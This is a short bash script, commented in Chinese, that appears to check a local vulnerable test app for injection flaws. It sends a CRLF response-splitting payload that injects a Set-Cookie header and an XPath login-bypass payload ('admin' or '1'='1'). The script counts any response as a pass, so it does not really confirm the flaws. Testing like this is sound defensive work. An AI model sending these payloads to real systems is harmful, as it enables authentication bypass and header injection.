#!/bin/bash
# 其他注入类漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}其他注入类漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo -e "  ${GREEN}[✓] 端点响应${NC}"
        echo "  响应: $(echo "$response" | head -c 100)..."
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 请求失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== CRLF 注入测试 ===${NC}"
test_case "CRLF 响应拆分" \
    "${BASE_URL}/crlf/injection?name=test\r\nSet-Cookie: attacker=stolen" \
    ""

echo -e "\n${BLUE}=== XPath 注入测试 ===${NC}"
test_case "XPath 认证绕过" \
    "${BASE_URL}/xpath/login?username=admin' or '1'='1&password=anything" \
    ""

echo -e "\n${BLUE}=== IP 伪造测试 ===${NC}"
test_case "X-Forwarded-For 伪造" \
    "${BASE_URL}/ip/spoof" \
    ""

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
